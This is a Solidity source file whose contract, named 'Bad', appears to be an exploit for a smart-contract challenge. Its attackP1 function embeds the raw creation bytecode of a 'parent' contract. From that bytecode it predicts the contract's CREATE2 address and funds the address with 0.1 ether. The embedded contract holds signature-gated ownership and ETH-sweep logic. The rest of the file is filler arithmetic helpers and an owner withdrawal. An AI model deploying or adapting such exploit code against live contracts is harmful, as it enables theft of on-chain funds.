pragma solidity ^0.8.0;

contract Bad {
    //leak
    address owner;

    event logAddress(address);

    constructor() payable {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Ownable: caller is not the owner!");
        _;
    }

    function attackP1(address badSon, address myAddr) public {
        bytes
            memory parent_bytecode = hex"60a060405234801561001057600080fd5b503373ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff168152505060805173ffffffffffffffffffffffffffffffffffffffff16638da5cb5b6040518163ffffffff1660e01b8152600401602060405180830381865afa158015610092573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100b6919061015d565b6000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555061018a565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061012a826100ff565b9050919050565b61013a8161011f565b811461014557600080fd5b50565b60008151905061015781610131565b92915050565b600060208284031215610173576101726100fa565b5b600061018184828501610148565b91505092915050565b608051610a0d6101c06000396000818160de01528181610102015281816101f60152818161026601526102f60152610a0d6000f3fe608060405234801561001057600080fd5b50600436106100575760003560e01c806312e6d9b01461005c578063197ae8e11461007a57806330504d21146100965780639890220b146100b4578063a5a75c84146100be575b600080fd5b6100646100dc565b6040516100719190610572565b60405180910390f35b610094600480360381019061008f919061063f565b610100565b005b61009e6101ed565b6040516100ab91906106b5565b60405180910390f35b6100bc610264565b005b6100c66103c1565b6040516100d391906106df565b60405180910390f35b7f000000000000000000000000000000000000000000000000000000000000000081565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461018e576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161018590610757565b60405180910390fd5b60006101986101ed565b90506101a6818585856103e5565b846000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505050505050565b600080469050807f000000000000000000000000000000000000000000000000000000000000000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660405160200161024893929190610790565b6040516020818303038152906040528051906020012091505090565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146102f2576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016102e990610757565b60405180910390fd5b60007f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1647604051610338906107f8565b60006040518083038185875af1925050503d8060008114610375576040519150601f19603f3d011682016040523d82523d6000602084013e61037a565b606091505b50509050806103be576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016103b590610859565b60405180910390fd5b50565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000846040516020016103f891906108f1565b60405160208183030381529060405280519060200120905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166001828686866040516000815260200160405260405161046a9493929190610926565b6020604051602081039080840390855afa15801561048c573d6000803e3d6000fd5b5050506020604051035173ffffffffffffffffffffffffffffffffffffffff16146104ec576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104e3906109b7565b60405180910390fd5b5050505050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061053861053361052e846104f3565b610513565b6104f3565b9050919050565b600061054a8261051d565b9050919050565b600061055c8261053f565b9050919050565b61056c81610551565b82525050565b60006020820190506105876000830184610563565b92915050565b600080fd5b600061059d826104f3565b9050919050565b6105ad81610592565b81146105b857600080fd5b50565b6000813590506105ca816105a4565b92915050565b600060ff82169050919050565b6105e6816105d0565b81146105f157600080fd5b50565b600081359050610603816105dd565b92915050565b6000819050919050565b61061c81610609565b811461062757600080fd5b50565b60008135905061063981610613565b92915050565b600080600080608085870312156106595761065861058d565b5b6000610667878288016105bb565b9450506020610678878288016105f4565b93505060406106898782880161062a565b925050606061069a8782880161062a565b91505092959194509250565b6106af81610609565b82525050565b60006020820190506106ca60008301846106a6565b92915050565b6106d981610592565b82525050565b60006020820190506106f460008301846106d0565b92915050565b600082825260208201905092915050565b7f6f6e6c7920736f6e2063616e2063616c6c000000000000000000000000000000600082015250565b60006107416011836106fa565b915061074c8261070b565b602082019050919050565b6000602082019050818103600083015261077081610734565b9050919050565b6000819050919050565b61078a81610777565b82525050565b60006060820190506107a56000830186610781565b6107b260208301856106d0565b6107bf60408301846106d0565b949350505050565b600081905092915050565b50565b60006107e26000836107c7565b91506107ed826107d2565b600082019050919050565b6000610803826107d5565b9150819050919050565b7f455448207472616e73666572206661696c656400000000000000000000000000600082015250565b60006108436013836106fa565b915061084e8261080d565b602082019050919050565b6000602082019050818103600083015261087281610836565b9050919050565b600081905092915050565b7f19457468657265756d205369676e6564204d6573736167653a0a333200000000600082015250565b60006108ba601c83610879565b91506108c582610884565b601c82019050919050565b6000819050919050565b6108eb6108e682610609565b6108d0565b82525050565b60006108fc826108ad565b915061090882846108da565b60208201915081905092915050565b610920816105d0565b82525050565b600060808201905061093b60008301876106a6565b6109486020830186610917565b61095560408301856106a6565b61096260608301846106a6565b95945050505050565b7f6e6f74207369676e6564206279206f776e657200000000000000000000000000600082015250565b60006109a16013836106fa565b91506109ac8261096b565b602082019050919050565b600060208201905081810360008301526109d081610994565b905091905056fea26469706673582212201e87538215b2046b7beea47351007c840aa61a5e787b9f6f6bdfd34d15f788e464736f6c63430008110033";

        bytes32 parent_hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                badSon,
                bytes32(uint256(uint160(myAddr))),
                keccak256(parent_bytecode)
            )
        );

        address parent_addr = address(uint160(uint(parent_hash)));

        emit logAddress(parent_addr);

        parent_addr.call{value: 0.1 ether}("");
    }

    function retrieveETH() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    function add(uint256 a, uint256 b) external pure returns (uint256) {
        return a + b;
    }

    function transferETH(address to) internal {
        payable(to).transfer(address(this).balance);
    }

    function tryAdd(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) private pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    receive() external payable {}

    fallback() external payable {}
}